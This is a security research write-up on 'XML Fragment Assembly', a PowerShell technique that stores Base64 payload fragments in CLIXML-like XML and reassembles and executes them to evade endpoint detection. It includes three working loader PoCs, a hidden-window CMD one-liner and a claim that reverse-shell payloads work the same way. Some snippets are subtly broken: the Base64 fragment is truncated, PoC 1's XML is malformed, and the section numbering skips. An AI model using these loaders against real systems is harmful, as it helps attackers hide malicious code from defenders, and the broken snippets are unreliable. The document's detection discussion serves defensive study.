XML Fragment Assembly
XFA – Defense Evasion Research

BoxStrike Research
Published: 7 August 2026 Research Duration: 1 day Author: Ensan Erdoğan Karaca Classification: Public

Summary: This research investigates a technique where encoded payload data is stored inside an XML structure and reconstructed during PowerShell execution without invoking CLIXML deserialization in the primary variants. The method uses PowerShell's XML parsing capabilities ([xml] + property traversal) to extract embedded fragments, concatenate them, decode the Base64 data, and execute the resulting PowerShell content dynamically. The research distinguishes between XML parsing and CLIXML deserialization, and does not claim universal EDR bypass — detection depends on product, configuration, and telemetry.

1. Introduction & Motivation

Modern security products, especially EDR (Endpoint Detection and Response) solutions, rely on a combination of signature-based and behavioural analysis to detect threats. PowerShell is one of the most heavily monitored tools. Commands such as Invoke-Expression, IEX, and CLIXML deserialisation calls like ConvertFrom-CliXml are often considered high-risk.

This research examines whether encoded data stored in an XML document can be extracted and executed using only XML parsing, intentionally avoiding PowerShell's CLIXML deserialization mechanisms. The goal is to document a potential behavioural pattern that may be relevant for both offensive and defensive security research.

Research scope: This report focuses on the mechanism of storing and reassembling encoded data via XML parsing. It does not claim to bypass any specific security product. Detection outcomes depend on the EDR/AV product version, configuration, logging settings, and telemetry sources.

2. The Core: CLIXML and XML Parsing

PowerShell uses CLIXML as an XML-based representation for serialized PowerShell objects. CLIXML can contain object type information, properties, and serialized values. The format is used extensively in PowerShell Remoting, Hyper-V, and various administrative tasks.

CLIXML deserialization and ordinary XML parsing are two distinct operations. PowerShell provides mechanisms such as ConvertFrom-CliXml and [System.Management.Automation.PSSerializer]::Deserialize() to reconstruct serialized PowerShell objects.

The first two PoC variants investigated in this report intentionally do not use those deserialization mechanisms. Instead, the document is loaded as an XML document using [xml], after which the embedded elements are accessed as XML data.

2.1 Serialization Versus Parsing

The presence of CLIXML-like elements such as <Objs>, <Obj>, <TN>, and <S> does not by itself mean that PowerShell has deserialized the document.

This distinction is central to the research: the PoC demonstrates that data contained in an XML document can be extracted and reconstructed without invoking the CLIXML object reconstruction mechanism.

2.2 XML Property Traversal vs XPath

In PowerShell, $xml.Objs.Obj.S is not an XPath query. It is PowerShell's property traversal syntax, which accesses properties of the underlying XML object model.

For reference, a genuine XPath query would use SelectNodes() or SelectSingleNode() with an XPath expression, for example:

$nodes = $xml.SelectNodes("//S")

The PoCs in this research use property traversal because it is simpler and does not require additional XPath syntax. The name XML Fragment Assembly (XFA) reflects the XML-based storage and fragment reconstruction mechanism, not the use of XPath specifically.

3. Methodology

The XML Fragment Assembly concept consists of storing encoded payload data inside an XML structure and reconstructing that data through PowerShell's XML handling capabilities. The important distinction is that the first two PoC variants do not invoke PowerShell CLIXML deserialization; they parse the XML as an XML document and access the embedded string data directly.

  • The payload is Base64-encoded (used as encoding/obfuscation, not encryption).
  • The encoded representation may be divided into multiple fragments.
  • The fragments are stored inside <S> elements.
  • The XML document is parsed by PowerShell using [xml].
  • The embedded values are retrieved via property traversal and concatenated.
  • The resulting Base64 data is decoded into the original command text.
  • The resulting text is converted into a ScriptBlock for execution.

In PoC 1 and PoC 2, the XML is processed through the PowerShell XML type accelerator ([xml]). No call to ConvertFrom-CliXml or PSSerializer.Deserialize() is made in these variants.

Base64 is used here as an encoding and obfuscation layer rather than encryption, because the data is merely transformed into a different representation, not cryptographically secured.

4. Proof of Concept (PoC)

Three PoC variants are presented below. The first stores the XML on disk, the second embeds it directly in the script (here-string, no deserialisation), and the third uses PowerShell 7.5's ConvertFrom-CliXml cmdlet as a comparison with CLIXML deserialization.

4.1 Test Payload

To demonstrate the mechanism without including a dangerous reverse shell in the core PoC, the following harmless MessageBox payload is used:

$testPayload = 'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("XFA PoC - Data reassembled successfully", "XFA Test")' $base64Test = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($testPayload)) # This Base64 string is then embedded in the XML fragments.

The same mechanism works with any payload, including reverse shells. A reverse shell variant is provided in the appendix.

PoC 1 – XML on Disk

payload.xml (with MessageBox fragments)

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"> <Obj><TN><T>System.String</T></TN> <S>QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW</S> </Objs>

Executor script:

# Read the XML file $xml = [xml](Get-Content -Path "payload.xml" -Raw) # Access all <S> elements via property traversal $segments = $xml.Objs.Obj.S # Concatenate and decode Base64 $combined = $segments -join '' $command = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($combined)) # Execute & ([scriptblock]::Create($command))

Note: This variant uses $xml.Objs.Obj.S which is PowerShell's property traversal, not XPath. It does not invoke CLIXML deserialization.

PoC 2 – XML Embedded (Here-String)

Single file, no disk, no deserialisation

$xmlPayload = @' <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"> <Obj><TN><T>System.String</T></TN> <S>QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW</S> <!-- Additional fragments would be placed here for larger payloads --> </Objs> '@ # Parse XML (no deserialisation) $xml = [xml]$xmlPayload $segments = $xml.Objs.Obj.S $combined = $segments -join '' $command = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($combined)) & ([scriptblock]::Create($command))

Note: This method uses no ConvertFrom-CliXml or PSSerializer.Deserialize. It has been tested on PowerShell 5.1 and 7.x in the research environment.

PoC 3 – Comparison: PowerShell 7.5 ConvertFrom-CliXml

This variant uses ConvertFrom-CliXml to process the supplied CLIXML-formatted data. Unlike PoC 1 and PoC 2, this variant explicitly invokes PowerShell's CLIXML deserialization mechanism.

This provides a useful comparison between ordinary XML parsing and CLIXML deserialization. The resulting object type and structure depend on the serialized XML representation; therefore, the PoC should not assume that every CLIXML input is returned as a String[].

Because this variant explicitly invokes deserialization, it represents a different execution path from the XML-parsing variants and should be evaluated separately when analysing telemetry and detection behaviour.

# PoC 3 – PowerShell 7.5 (ConvertFrom-CliXml) # XML payload (here-string) – using MessageBox test payload $xmlPayload = @' <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"> <Obj><TN><T>System.String</T></TN><S>QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW</S></Obj> </Objs> '@ # ConvertFrom-CliXml ile doğrudan string dizisine dönüştür (PowerShell 7.5+) $segments = $xmlPayload | ConvertFrom-CliXml # Birleştir $combinedBase64 = $segments -join '' # Decode et $fullCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($combinedBase64)) # Çalıştır & ([scriptblock]::Create($fullCommand))
Note: This PoC requires PowerShell 7.5 or later because ConvertFrom-CliXml is a cmdlet introduced in that version. It explicitly uses deserialisation, which is a different execution path from PoC 1 and PoC 2.

One‑liner for CMD (PoC 2):

powershell -nop -w hidden -c "$x=[xml]@'<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"><Obj><TN><T>System.String</T></TN><S>QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW</S></Obj></Objs>'@;$s=$x.Objs.Obj.S;$c=$s-join'';$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c));&([scriptblock]::Create($f))"

5. Detection Considerations

The technique demonstrates how several individually legitimate operations can be combined into a single execution chain. This does not imply that these operations are universally undetected. Detection behaviour depends on the EDR/AV product, version, configuration, telemetry sources, PowerShell logging settings, and behavioural analytics in use.

  • Encoded content: Base64 data can conceal the semantics of the underlying command from simple content inspection. However, many EDRs can detect long Base64 strings or patterns indicative of encoded commands.
  • XML parsing: Loading an XML document with [xml] is a legitimate PowerShell operation and therefore must be distinguished from CLIXML deserialization. Some EDRs may not treat this as suspicious.
  • Runtime reconstruction: The encoded content is reconstructed during execution rather than appearing directly as readable command text in the XML container. This may hinder static analysis.
  • ScriptBlock execution: Dynamically creating executable PowerShell code using [scriptblock]::Create() introduces a behavioural detection opportunity even when the original payload is encoded.

Consequently, this technique should not be described as a guaranteed EDR bypass. Rather, the research demonstrates a potential visibility gap created by the combination of encoded data, XML parsing, runtime reconstruction, and dynamic PowerShell execution. The actual detection rate will vary depending on the target environment.

8. Conclusion

The XML Fragment Assembly (XFA) research demonstrates how encoded data can be embedded within an XML structure and reconstructed during PowerShell execution without invoking CLIXML deserialization in the primary PoC variants.

The key observation is the distinction between ordinary XML parsing and PowerShell's CLIXML deserialization mechanism. The PoC shows that a CLIXML-like XML structure can be treated simply as XML data, allowing embedded values to be extracted, concatenated, decoded, and subsequently processed as PowerShell code.

This research does not establish that the technique universally bypasses EDR/AV products. Instead, it identifies a potentially relevant behavioural pattern that security products can monitor: encoded content stored in XML, runtime reconstruction, Base64 decoding, and subsequent dynamic PowerShell execution. The actual detection rate will depend on the specific EDR/AV product, version, configuration, and telemetry sources in use.

BoxStrike publishes this research to document the technique and encourage further investigation into behavioural detection strategies capable of correlating these individual operations into a single execution chain.
